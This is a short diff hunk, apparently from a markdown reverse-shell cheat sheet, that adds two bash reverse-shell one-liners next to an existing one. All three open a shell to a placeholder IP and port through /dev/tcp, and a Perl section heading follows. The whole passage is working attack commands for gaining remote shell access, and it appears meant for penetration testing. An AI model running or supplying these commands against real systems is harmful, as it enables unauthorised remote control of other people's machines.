@@ -211,6 +211,8 @@ Source code:
 
 ```
 bash -i >& /dev/tcp/<ip>/<port> 0>&1
+0<&196;exec 196<>/dev/tcp/<ip>/<port>; sh <&196 >&196 2>&196
+exec 5<>/dev/tcp/<ip>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done
 ```
 
 ## Perl
